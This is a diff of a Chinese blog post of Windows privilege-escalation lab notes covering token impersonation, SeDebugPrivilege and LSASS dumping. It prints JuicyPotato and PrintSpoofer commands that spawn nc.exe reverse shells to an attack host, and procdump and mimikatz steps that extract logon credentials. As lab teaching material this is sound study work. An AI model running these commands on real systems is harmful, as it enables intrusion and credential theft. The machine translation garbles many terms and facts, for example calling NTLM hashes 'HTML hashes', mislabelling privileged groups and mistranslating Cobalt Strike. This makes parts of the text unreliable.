-<p><strong>当前用户, Current User</strong> 当我们访问主机时，应该先检查账户运行的用户环境。有时候，我们已经是系统或同等存在了！假设我们以服务账户身份获得访问权限。在这种情况下，我们可能拥有像 <code>SeImpersonatePrivilege</code> 这样的权限，这些权限常常很容易被滥用，用 <a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noreferrer">Juicy Potato</a> 等工具升级权限。</p>
+<p><strong>当前用户, Current User</strong> 当我们访问主机时，应该先检查账户运行的用户环境。有时候，我们已经是系统或同等存在了！假设我们以服务账户身份获得访问权限。在这种情况下，我们可能拥有像 <code>SeImpersonatePrivilege</code> 这样的权限，这些权限常常很容易被滥用，用 <a href="https://github.com/ohpe/juicy-potato" rel="noreferrer" target="_blank">Juicy Potato</a> 等工具升级权限。</p>
 <pre><code class="language-cmd-session">C:\htb&gt; echo %USERNAME%
 
 htb-student </code></pre>
@@ -6231,7 +6239,7 @@ The command completed successfully.</code></pre>
 <p>寻找权限升级的最佳地点之一是系统上正在运行的进程。即使进程不以管理员身份运行，也可能获得额外的权限。最常见的例子是发现一台像 IIS 或 XAMPP 这样的 Web 服务器运行在主机上，放置 <code>aspx/php</code> shell，并以运行 Web 服务器的用户身份获得 shell。通常，这不是管理员，但通常会有 <code>SeImpersonate</code> 令牌，允许 <code>Rogue/Juicy/Lonely Potato</code> 提供系统权限。</p>
 <p><strong>Access Tokens 访问令牌</strong> 在 Windows 中， 访问令牌用于描述进程或线程的安全上下文（安全属性或规则）。令牌包含用户账户身份信息以及与特定进程或线程相关的权限。当用户向系统进行身份验证时，其密码会通过安全数据库进行验证，如果正确认证，他们将获得一个访问令牌。每当用户与进程交互时，都会显示该令牌的副本以确定其权限等级。</p>
 <h3>枚举网络服务</h3>
-<p>人们与进程交互最常见的方式是通过网络套接字（DNS、HTTP、SMB 等）。<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat" target="_blank" rel="noreferrer">netstat</a> 命令会显示当前的 TCP 和 UDP 连接，这能让我们更好地了解哪些服务在本地和外部可访问的端口上监听。我们可能会发现只有本地主机登录后才能访问的漏洞服务，可以利用它来升级权限。</p>
+<p>人们与进程交互最常见的方式是通过网络套接字（DNS、HTTP、SMB 等）。<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat" rel="noreferrer" target="_blank">netstat</a> 命令会显示当前的 TCP 和 UDP 连接，这能让我们更好地了解哪些服务在本地和外部可访问的端口上监听。我们可能会发现只有本地主机登录后才能访问的漏洞服务，可以利用它来升级权限。</p>
 <p><strong>显示主动网络连接</strong></p>
 <pre><code class="language-cmd-session">C:\htb&gt; netstat -ano
 
@@ -6290,7 +6298,7 @@ Active Connections
 &lt;SNIP&gt;</code></pre>
 <p>使用主动网络连接时，主要要注意的是那些在环回地址（<code>127.0.0.1</code> 和 <code>：：1</code>）上监听的条目，这些条目没有监听 IP 地址（<code>10.129.43.8</code>）或广播地址（<code>0.0.0.0</code>，<code>：：/0</code>）。原因是 localhost 上的网络套接字通常不安全，因为人们认为“它们无法被网络访问”。最明显的是 <code>14147</code> 号端口，用于 FileZilla 的管理界面。通过连接该端口，除了作为 FileZilla 服务器用户（可能是管理员）创建 f.P 共享的 c：\外，可能还能提取 FTP 密码。</p>
 <h3>命名管道</h3>
-<p>进程之间的另一种通信方式是通过命名管道。管道本质上是存储在内存中的文件，读取后会被清除。钴打击为每个命令（不含 <a href="https://www.cobaltstrike.com/help-beacon-object-files" target="_blank" rel="noreferrer">BOF</a>）使用命名管道。工作流程基本如下：</p>
+<p>进程之间的另一种通信方式是通过命名管道。管道本质上是存储在内存中的文件，读取后会被清除。钴打击为每个命令（不含 <a href="https://www.cobaltstrike.com/help-beacon-object-files" rel="noreferrer" target="_blank">BOF</a>）使用命名管道。工作流程基本如下：</p>
 <p>信标启动了一条名为 \.\pipe\ 的管道 msagent_12</p>
 <p>信标启动一个新进程，并向该进程注入命令，将输出导向 \.\pipe\msagent_12</p>
 <p>服务器显示写入 \.\pipe\ 的内容 msagent_12</p>
@@ -6362,13 +6370,13 @@ Mode                LastWriteTime         Length Name
 ------       12/31/1600   4:00 PM              3 epmapper
 
 &lt;SNIP&gt;</code></pre>
-<p>获得命名管道列表后，我们可以使用 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" target="_blank" rel="noreferrer">Accesschk</a> 通过查看自由裁量访问列表（DACL）来枚举特定命名管道的权限，DACL 显示谁拥有修改、写入、读取或执行资源的权限。让我们来看看 <code>LSASS</code> 的流程。我们也可以使用命令 <code>.\accesschk.exe /accepteula \pipe\</code> 来审查所有命名管道的 DACL 。</p>
+<p>获得命名管道列表后，我们可以使用 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" rel="noreferrer" target="_blank">Accesschk</a> 通过查看自由裁量访问列表（DACL）来枚举特定命名管道的权限，DACL 显示谁拥有修改、写入、读取或执行资源的权限。让我们来看看 <code>LSASS</code> 的流程。我们也可以使用命令 <code>.\accesschk.exe /accepteula \pipe\</code> 来审查所有命名管道的 DACL 。</p>
 <h2>用户权限</h2>
 <p>中的权限是指账户可以被授予在本地系统上执行各种作的权利，比如管理服务、加载驱动程序、关闭系统、调试应用程序等。权限不同于访问权，后者是系统用来授予或拒绝访问可保护对象的。用户和组权限存储在数据库中，用户登录系统时通过访问令牌授予。账户可以对特定计算机拥有本地权限，如果账户属于 Active Directory 域，则在不同系统上拥有不同的权限。每当用户尝试执行特权作时，系统会检查该用户的访问令牌，以确认账户是否具备所需权限，如果有，会检查这些令牌是否已被启用。大多数权限默认是被禁用的。有些可以通过打开管理 cmd.exe 或 PowerShell 控制台来启用，而另一些则可以通过手动启用。</p>
 <p>评估的目标通常是获得对一个或多个系统的管理访问权限。假设我们可以以特定权限用户身份登录系统。在这种情况下，我们或许可以利用内置功能直接提升权限，或者利用目标账户分配的权限来进一步提升访问权限，以实现最终目标。</p>
 <p><strong>Windows授权流程</strong> 安全主体是指任何可以被 Windows 操作系统认证的对象，包括用户账户和计算机账户、在安全上下文中运行的进程，或其他用户/计算机账户，或这些账户所属的安全组。安全主体是控制 Windows 主机资源访问的主要方式。每个安全主体都由唯一的安全标识符（SID） 标识。当创建安全主体时，会被分配一个 SID，该 SID 在其生命周期内一直分配给该主体。</p>
 <p>下图从高层次讲解了 Windows 授权和访问控制流程，例如，当用户尝试访问文件共享中的可安全对象（如文件夹）时，该过程就开始了。在此过程中，用户的访问令牌（包括其用户 SID、其所属组的 SID、权限列表及其他访问信息）会与对象安全描述符内的访问控制条目（ACEs）进行比较（ACEs，ACEs 包含可保护对象的安全信息，如授予用户或组的访问权，下文将讨论）。一旦比较完成，就会决定是否授予访问。每当用户尝试访问 Windows 主机上的资源时，整个过程几乎瞬间发生。作为我们列举和特权提升活动的一部分，我们试图利用和滥用访问权，利用或介入该授权流程，以进一步推进目标的访问。</p>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228022956.png" alt="Pasted image 20260228022956" />
+<img alt="Pasted image 20260228022956" src="assets/posts/windows-privilege-escalation/Pasted image 20260228022956.png"/>
 <p><strong>Windows中的权力与特权，Rights and Privileges</strong> Windows 包含许多赋予成员强大权利和特权的群体。其中许多都可能被滥用，在独立的 Windows 主机和 Active Directory 域环境中提升权限。最终，这些资源可以用来获得 Windows 工作站、服务器或域控制器（DC）上的域管理员、本地管理员或系统权限。以下列出其中一些团体。</p>
 <div class="post-table-wrap"><table><thead><tr><th><strong>Group  集团</strong></th><th><strong>Description  描述</strong></th></tr></thead><tbody><tr><td>默认管理员</td><td>域管理员和企业管理员是“超级”组。</td></tr><tr><td>服务器运营者</td><td>成员可以修改服务、访问 SMB 共享和备份文件。</td></tr><tr><td>备用</td><td>成员可以本地登录 DC，应被视为域管理员。他们可以复制 SAM/NTDS 数据库的影子副本，远程读取注册表，并通过 SMB 访问 DC 上的文件系统。该组有时会加入非 DC 的本地备份组。</td></tr><tr><td>打印</td><td>成员可以登录本地的 DC，并“欺骗”Windows 加载恶意驱动程序。</td></tr><tr><td>管理员</td><td>如果存在虚拟数据中心，任何虚拟化管理员，如 Hyper-V 管理员成员，都应被视为域管理员。</td></tr><tr><td>账户运营方</td><td>成员可以修改域内非受保护的账户和组。</td></tr><tr><td>远程桌面用户</td><td>成员默认没有任何有用的权限，但通常会被赋予额外权限 <code>Allow Login Through Remote Desktop Services</code> ，比如，并且可以通过 RDP 协议进行横向移动。</td></tr><tr><td>远程管理用户</td><td>成员可以通过 PSRemoting 登录 DC（该组有时会加入非 DC 的本地远程管理组）。</td></tr><tr><td>组策略创建者所有者</td><td>成员可以创建新的 GPO，但需要被授权额外权限才能将 GPO 关联到容器，如域或 OU。</td></tr><tr><td>模式管理员</td><td>成员可以通过在默认对象 ACL 中添加被攻破的账户来修改 Active Directory 的模式结构，并对任何待创建的 Group/GPO 进行背门。</td></tr><tr><td>管理员</td><td>成员可以在 DC 上加载 DLL，但没有重启 DNS 服务器的必要权限。他们可以加载恶意 DLL，等待重启作为持久化机制。加载 DLL 通常会导致服务崩溃。利用该群体的更可靠方法是创建一个 WPAD 记录 。</td></tr></tbody></table></div>
 <p><strong>用户权利转让</strong> 根据组成员身份以及通过域和本地组策略分配的权限等其他因素，用户可能会为其账户分配各种权限。这篇关于用户权利转让的 Microsoft 文章详细说明了 Windows 中可设置的每种用户权限以及适用于每个权限的安全考虑。以下是一些关键的用户权限分配，这些设置是应用于本地主机的。这些权限允许用户在系统上执行任务，如本地或远程登录、从网络访问主机、关闭服务器等。</p>
@@ -6429,7 +6437,7 @@ Privilege Name                Description                    State
 ============================= ============================== ========
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
-<p>用户权利会根据他们被分配到的组或分配的权限而增加。以下是备份组中授予用户权利的一个示例。该组用户拥有 UAC 目前限制的其他权利。不过，从这个命令我们可以看出他们有 <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/shut-down-the-system" target="_blank" rel="noreferrer">SeShutdownPrivilege</a>，这意味着他们可以关闭一个域控制器，如果他们在本地登录域控制器（而不是通过 RDP 或 WinRM），可能会导致巨大的服务中断。</p>
+<p>用户权利会根据他们被分配到的组或分配的权限而增加。以下是备份组中授予用户权利的一个示例。该组用户拥有 UAC 目前限制的其他权利。不过，从这个命令我们可以看出他们有 <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/shut-down-the-system" rel="noreferrer" target="_blank">SeShutdownPrivilege</a>，这意味着他们可以关闭一个域控制器，如果他们在本地登录域控制器（而不是通过 RDP 或 WinRM），可能会导致巨大的服务中断。</p>
 <p><strong>Backup Operators Rights， 备用权力</strong></p>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; whoami /priv
 
@@ -6442,14 +6450,14 @@ SeShutdownPrivilege           Shut down the system           Disabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
 <p><strong>Detection  检测</strong></p>
-<p>This <a href="https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e" target="_blank" rel="noreferrer">post</a> is worth a read for more information on Windows privileges as well as detecting and preventing abuse, specifically by logging event <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672" target="_blank" rel="noreferrer">4672: Special privileges assigned to new logon</a> which will generate an event if certain sensitive privileges are assigned to a new logon session. This can be fine-tuned in many ways, such as by monitoring privileges that should _never_ be assigned or those that should only ever be assigned to specific accounts. 本文值得[](https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e)一读，了解更多关于 Windows 权限以及检测和防止滥用的信息，特别是通过记录事件 4672：分配给新登录的特殊权限 ，如果新登录会话被分配了某些敏感权限，该事件将引发事件。这可以通过多种方式进行微调，比如监控_不应_被分配的权限，或只应分配给特定账户的权限。</p>
+<p>This <a href="https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e" rel="noreferrer" target="_blank">post</a> is worth a read for more information on Windows privileges as well as detecting and preventing abuse, specifically by logging event <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672" rel="noreferrer" target="_blank">4672: Special privileges assigned to new logon</a> which will generate an event if certain sensitive privileges are assigned to a new logon session. This can be fine-tuned in many ways, such as by monitoring privileges that should _never_ be assigned or those that should only ever be assigned to specific accounts. 本文值得[](https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e)一读，了解更多关于 Windows 权限以及检测和防止滥用的信息，特别是通过记录事件 4672：分配给新登录的特殊权限 ，如果新登录会话被分配了某些敏感权限，该事件将引发事件。这可以通过多种方式进行微调，比如监控_不应_被分配的权限，或只应分配给特定账户的权限。</p>
 <h3>SeImpersonate 与 SeAssignPrimaryToken 权限</h3>
-<p>在 Windows 中，每个进程都有一个令牌，里面包含运行该账户的信息。这些令牌不被视为安全资源，因为它们只是内存中可能被无法读取内存的用户暴力破解的内存位置。要使用该令牌，需要具备<code>冒充</code>特权。该保护仅授予管理账户，且在大多数情况下可在系统加固过程中移除。使用该令牌的一个例子是 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw" target="_blank" rel="noreferrer">CreateProcessWithTokenW</a>。</p>
+<p>在 Windows 中，每个进程都有一个令牌，里面包含运行该账户的信息。这些令牌不被视为安全资源，因为它们只是内存中可能被无法读取内存的用户暴力破解的内存位置。要使用该令牌，需要具备<code>冒充</code>特权。该保护仅授予管理账户，且在大多数情况下可在系统加固过程中移除。使用该令牌的一个例子是 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw" rel="noreferrer" target="_blank">CreateProcessWithTokenW</a>。</p>
 <p>合法程序可以利用其他进程的令牌从管理员升级到本地系统，后者拥有额外权限。进程通常通过调用 WinLogon 进程获取 SYSTEM 令牌，然后用该令牌执行自身，并将其置于 SYSTEM 空间中。攻击者常在“土豆式”私密账户中滥用此权限——服务账户可以<code>冒充</code> ，但无法获得完整的系统级权限。本质上，Potato 攻击欺骗以 SYSTEM 运行的进程连接到其进程，进进程交出供使用的令牌。</p>
 <p>我们通常会在通过在服务账户上下文中运行的应用程序获得远程代码执行后获得此权限（例如，将网页壳上传到 ASP.NET 的网页应用，通过 Jenkins 安装实现远程代码执行，或通过 MSSQL 查询执行命令）。每当我们通过这种方式获得访问权限时，应立即检查是否有权限，因为它的存在通常为获得更高权限提供了快速且便捷的途径。本文值得一读，以了解更多关于代币冒充攻击的细节。</p>
 <p><strong>Selmpersonate Example - JuicyPotato</strong> 我们以下面的例子为例，我们通过一个特权 SQL 用户在 SQL 服务器上站稳脚跟。客户端连接到 IIS 和 SQL Server 时可以配置为使用 Windows 认证。服务器随后可能需要访问其他资源，如文件共享，作为连接客户端。这可以通过冒充客户端连接所建立的上下文用户来实现。为此，服务账户将在认证权限后获得“ 冒充客户端 ”的授权。</p>
 <p>在这种情况下，SQL Service 服务账户运行在默认的 <code>mssqlserver</code> 账户上下文中。想象一下，我们通过 <code>Snaffler</code> 工具实现了命令执行，用户使用 <code>xp_cmdshell</code> 在文件共享中获得的 <code>logins.sql</code> 文件中的一组凭证。</p>
-<p>利用凭证 <code>sql_dev：Str0ng_P@ssw0rd！</code>，我们先连接到 SQL 服务器实例并确认权限。我们可以用 <code>Impacket</code> 工具包中的 <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py" target="_blank" rel="noreferrer">mssqlclient.py</a> 来实现这一点。</p>
+<p>利用凭证 <code>sql_dev：Str0ng_P@ssw0rd！</code>，我们先连接到 SQL 服务器实例并确认权限。我们可以用 <code>Impacket</code> 工具包中的 <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py" rel="noreferrer" target="_blank">mssqlclient.py</a> 来实现这一点。</p>
 <ol><li>Connecting with MSSQLClient.py</li></ol>
 <pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ impacket-mssqlclient sql_dev@10.129.28.157 -windows-auth
 
@@ -6501,8 +6509,8 @@ SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
 SeCreateGlobalPrivilege       Create global objects                     Enabled    
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   </code></pre>
-<p>命令 <code>whoami /priv</code> 确认 <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege" target="_blank" rel="noreferrer">SeImpersonatePrivilege</a> 已被列出。该特权可用于冒充如 <code>NT AUTHORITY\SYSTEM</code> 等特权账户。<a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noreferrer">JuicyPotato</a> 可以通过 DCOM/NTLM 反射滥用来利用 <code>SeImpersonate</code> 或 <code>SeAssignPrimaryToken</code> 的权限。</p>
-<p>为了利用这些权限升级权限，首先下载 <code>JuicyPotato.exe</code> 二进制文件并上传，并 <code>nc.exe</code> 到目标服务器。接着，在 8443 端口建立一个 Netcat 监听器，执行以下命令，其中 <code>-l</code> 是 COM 服务器监听端口， <code>-p</code> 是启动程序（cmd.exe）， <code>-a</code> 是传递给 cmd.exe 的参数， <code>-t</code> 是 <code>createprocess</code> 调用。 下面，我们告诉该工具同时尝试 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw" target="_blank" rel="noreferrer">CreateProcessWithTokenW</a> 和 <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera" target="_blank" rel="noreferrer">CreateProcessAsUser</a> 函数，这两者分别需要 <code>SeImpersonate</code> 或 <code>SeAssignPrimaryToken</code> 权限。</p>
+<p>命令 <code>whoami /priv</code> 确认 <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege" rel="noreferrer" target="_blank">SeImpersonatePrivilege</a> 已被列出。该特权可用于冒充如 <code>NT AUTHORITY\SYSTEM</code> 等特权账户。<a href="https://github.com/ohpe/juicy-potato" rel="noreferrer" target="_blank">JuicyPotato</a> 可以通过 DCOM/NTLM 反射滥用来利用 <code>SeImpersonate</code> 或 <code>SeAssignPrimaryToken</code> 的权限。</p>
+<p>为了利用这些权限升级权限，首先下载 <code>JuicyPotato.exe</code> 二进制文件并上传，并 <code>nc.exe</code> 到目标服务器。接着，在 8443 端口建立一个 Netcat 监听器，执行以下命令，其中 <code>-l</code> 是 COM 服务器监听端口， <code>-p</code> 是启动程序（cmd.exe）， <code>-a</code> 是传递给 cmd.exe 的参数， <code>-t</code> 是 <code>createprocess</code> 调用。 下面，我们告诉该工具同时尝试 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw" rel="noreferrer" target="_blank">CreateProcessWithTokenW</a> 和 <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera" rel="noreferrer" target="_blank">CreateProcessAsUser</a> 函数，这两者分别需要 <code>SeImpersonate</code> 或 <code>SeAssignPrimaryToken</code> 权限。</p>
 <ol><li>Escalating Privileges Using JuicyPotato</li></ol>
 <pre><code class="language-shell-session">SQL&gt; xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.38 8443 -e cmd.exe" -t *
 
@@ -6536,7 +6544,7 @@ C:\Windows\system32&gt;hostname
 
 hostname
 WINLPE-SRV01</code></pre>
-<p><strong>PringSpoofer and RoguePotato</strong> JuicyPotato 无法支持 Windows Server 2019 和 Windows 10 版本 1809 及以后版本。然而，<a href="https://github.com/itm4n/PrintSpoofer" target="_blank" rel="noreferrer">PrintSpoofer</a> 和 <a href="https://github.com/antonioCoco/RoguePotato" target="_blank" rel="noreferrer">RoguePotato</a> 也可以利用相同的权限，获得 <code>NT 权威/系统</code>级别的访问权限。这篇博客文章深入介绍了 <code>PrintSpoofer</code> 工具，该工具可用于滥用 Windows 10 和 Server 2019 主机上的冒充权限，而 JuicyPotato 已无法正常工作。</p>
+<p><strong>PringSpoofer and RoguePotato</strong> JuicyPotato 无法支持 Windows Server 2019 和 Windows 10 版本 1809 及以后版本。然而，<a href="https://github.com/itm4n/PrintSpoofer" rel="noreferrer" target="_blank">PrintSpoofer</a> 和 <a href="https://github.com/antonioCoco/RoguePotato" rel="noreferrer" target="_blank">RoguePotato</a> 也可以利用相同的权限，获得 <code>NT 权威/系统</code>级别的访问权限。这篇博客文章深入介绍了 <code>PrintSpoofer</code> 工具，该工具可用于滥用 Windows 10 和 Server 2019 主机上的冒充权限，而 JuicyPotato 已无法正常工作。</p>
 <p>让我们用 <code>PrintSpoofer</code> 工具试试看。我们可以用这个工具在你当前控制台中生成一个 SYSTEM 进程并与之交互，在桌面上生成一个 SYSTEM 进程（如果是本地登录或通过 RDP），或者捕捉反向 shell——我们在我们的示例中会做这件事。同样，连接 <code>mssqlclient.py</code>，使用带有 <code>-c</code> 参数的工具执行命令。这里，利用 <code>nc.exe</code> 生成反向 shell（Netcat 监听器在 8443 端口等待我们的攻击盒）。</p>
 <ol><li>Escalating Privilege using PrintSpoofer</li></ol>
 <pre><code class="language-shell-session">SQL&gt; xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.15.38 8443 -e cmd"
@@ -6567,9 +6575,9 @@ C:\Windows\system32&gt;whoami
 whoami
 nt authority\system</code></pre>
 <h3>SeDebugPrivilege 调试权限</h3>
-<p>为了运行某个特定应用程序或服务或协助故障排除，用户可能会被分配 <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs" target="_blank" rel="noreferrer">SeDebugPrivilege</a>，而不是将该账户添加到管理员组中。该权限可以通过本地或域组策略在 <code>Computer Settings &gt; Windows Settings &gt; Security Settings</code> .默认情况下，只有管理员拥有此权限，因为它可用于从系统内存中捕获敏感信息，或访问/修改内核和应用结构。该权利可能分配给需要在日常工作中调试新系统组件的开发者。该用户权利应谨慎授予，因为任何被分配的账户都会访问关键操作系统组件。</p>
+<p>为了运行某个特定应用程序或服务或协助故障排除，用户可能会被分配 <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs" rel="noreferrer" target="_blank">SeDebugPrivilege</a>，而不是将该账户添加到管理员组中。该权限可以通过本地或域组策略在 <code>Computer Settings &gt; Windows Settings &gt; Security Settings</code> .默认情况下，只有管理员拥有此权限，因为它可用于从系统内存中捕获敏感信息，或访问/修改内核和应用结构。该权利可能分配给需要在日常工作中调试新系统组件的开发者。该用户权利应谨慎授予，因为任何被分配的账户都会访问关键操作系统组件。</p>
 <p>在内部渗透测试中，利用 LinkedIn 等网站收集潜在用户信息以进行定位通常很有帮助。假设我们正在使用 <code>Responder</code> 或 <code>Inveigh</code> 获取许多 NTLMv2 密码哈希值。在这种情况下，我们可能想将破解密码哈希的努力重点放在可能的高价值账户上，比如更可能被分配此类权限的开发者。用户可能不是主机的本地管理员，但拥有我们无法用 BloodHound 等工具远程枚举的权利。在我们为多个用户获取凭证，并且拥有一个或多个主机的 RDP 访问权限但没有额外权限的环境下，这点值得检查。</p>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228032219.png" alt="Pasted image 20260228032219" />
+<img alt="Pasted image 20260228032219" src="assets/posts/windows-privilege-escalation/Pasted image 20260228032219.png"/>
 <p>作为被分配调试<code>程序</code>权限的用户登录并打开提升的 shell 后，我们看到 <code>SeDebugPrivilege</code> 被列为列表。</p>
 <pre><code class="language-cmd-session">C:\htb&gt; whoami /priv
 
@@ -6581,7 +6589,7 @@ Privilege Name                            Description                           
 SeDebugPrivilege                          Debug programs                                                     Disabled
 SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
 SeIncreaseWorkingSetPrivilege             Increase a process working set      </code></pre>
-<p>我们可以利用 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noreferrer">SysInternals</a> 套件中的 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank" rel="noreferrer">ProcDump</a> 来利用这一权限，转储进程内存。一个不错的候选是本地安全管理局子系统服务（<a href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service" target="_blank" rel="noreferrer">LSASS</a>）进程，它在用户登录系统后存储用户凭证。</p>
+<p>我们可以利用 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" rel="noreferrer" target="_blank">SysInternals</a> 套件中的 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" rel="noreferrer" target="_blank">ProcDump</a> 来利用这一权限，转储进程内存。一个不错的候选是本地安全管理局子系统服务（<a href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service" rel="noreferrer" target="_blank">LSASS</a>）进程，它在用户登录系统后存储用户凭证。</p>
 <pre><code class="language-cmd-session">C:\htb&gt; procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
 ProcDump v10.0 - Sysinternals process dump utility
@@ -6658,9 +6666,9 @@ SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
 
 &lt;SNIP&gt;</code></pre>
 <p>假设我们因为某种原因无法在目标上加载工具，但拥有 RDP 访问权限。在这种情况下，我们可以通过任务管理器手动转储 <code>LSASS</code> 进程，方法是浏览“ <code>Details</code> ”标签，选择 <code>LSASS</code> 进程，然后选择 <code>Create dump file</code> 。将该文件下载回攻击系统后，我们可以用 Mimikatz 处理它，就像前面的例子一样。</p>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228035858.png" alt="Pasted image 20260228035858" />
+<img alt="Pasted image 20260228035858" src="assets/posts/windows-privilege-escalation/Pasted image 20260228035858.png"/>
 <p><strong>先用procdump.exe来运行lsass.exe这个程序，之后转存其dump文件到mimikatz.exe的同目录下，并运行mimikatz.exe，在执行这三条命令<code>log</code> <code>sekurlsa::minidump lsass.dmp</code> <code>sekurlsa::logonpasswords</code> ，就可以获得HTML哈希</strong></p>
-<p><strong>作为SYSTEM的远程代码执行</strong> 我们也可以利用 <code>SeDebugPrivilege</code> 来实现 <a href="https://decoder.cloud/2018/02/02/getting-system/" target="_blank" rel="noreferrer">RCE</a>。利用这种技术，我们可以通过启动子进程 ，利用通过 <code>SeDebugPrivilege</code> 赋予账户的提升权限，改变正常系统行为，继承父进程的令牌并冒充它，从而将权限提升到 SYSTEM。如果我们以 SYSTEM 形式运行的父进程（指定目标进程或运行程序的进程 ID（或 PID），那么我们可以快速提升权限。让我们看看实际作。</p>
+<p><strong>作为SYSTEM的远程代码执行</strong> 我们也可以利用 <code>SeDebugPrivilege</code> 来实现 <a href="https://decoder.cloud/2018/02/02/getting-system/" rel="noreferrer" target="_blank">RCE</a>。利用这种技术，我们可以通过启动子进程 ，利用通过 <code>SeDebugPrivilege</code> 赋予账户的提升权限，改变正常系统行为，继承父进程的令牌并冒充它，从而将权限提升到 SYSTEM。如果我们以 SYSTEM 形式运行的父进程（指定目标进程或运行程序的进程 ID（或 PID），那么我们可以快速提升权限。让我们看看实际作。</p>
 <p>首先，将这个 PoC 脚本传输到目标系统。接下来我们只需加载脚本，并用以下语法 <code>[MyProcess]::CreateProcessFromParent(&lt;system_pid&gt;,&lt;command_to_execute&gt;,"")</code> 运行。注意，我们必须在末尾添加第三个空参数 <code>""</code>，这样 PoC 才能正常工作。</p>
 <p>首先，打开一个提升级的 PowerShell 控制台（右键点击，以管理员身份运行，输入 <code>Jordan</code> 用户的凭据）。接着，输入<code>任务列表</code> ，获取正在运行的进程及其相关 PID 的列表。</p>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; tasklist 
@@ -6675,23 +6683,23 @@ wininit.exe                    548 Services                   0      5,240 K
 csrss.exe                      556 Console                    1      5,972 K
 winlogon.exe                   612 Console                    1     10,408 K</code></pre>
 <p>这里我们可以针对运行在 PID 612 下的 <code>winlogon.exe</code>，我们知道它在 Windows 主机上作为 SYSTEM 运行。</p>
-<p>我们也可以使用 <a href="https://docs.microsoft.com/en-us/PowerShell/module/microsoft.PowerShell.management/get-process?view=PowerShell-7.2" target="_blank" rel="noreferrer">Get-Process</a> cmdlet 抓取一个知名进程（如 LSASS）的 PID，并直接传递给脚本，从而减少所需的步骤。</p>
-<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228040031.png" alt="Pasted image 20260228040031" />
+<p>我们也可以使用 <a href="https://docs.microsoft.com/en-us/PowerShell/module/microsoft.PowerShell.management/get-process?view=PowerShell-7.2" rel="noreferrer" target="_blank">Get-Process</a> cmdlet 抓取一个知名进程（如 LSASS）的 PID，并直接传递给脚本，从而减少所需的步骤。</p>
+<img alt="Pasted image 20260228040031" src="assets/posts/windows-privilege-escalation/Pasted image 20260228040031.png"/>
 <p>还有类似这样的工具，可以在我们有 <code>SeDebugPrivilege</code> 时弹出 SYSTEM shell。通常我们无法通过 RDP 访问主机，因此必须修改 PoC，要么将反向 shell 返回攻击主机，作为 SYSTEM，要么通过其他命令，比如添加管理员用户。试着玩玩这些 PoC，看看还有什么其他方式可以实现 SYSTEM 访问，尤其是当你没有完全交互式的会话时，比如实现命令注入，或者作为 <code>SeDebugPrivilege</code> 的用户拥有网页壳或反向 shell 连接。请记住这些例子，以防你遇到倾销 LSASS 无法获得有用凭证的情况（虽然我们可以通过机器的 NTLM 哈希获得 SYSTEM 访问权限，但这超出本模块范围），并且用 shell 或 RCE 作为 SYSTEM 会很有帮助。</p>
 <h3>SeTakeOwnershipPrivilege 取得所有权权限</h3>
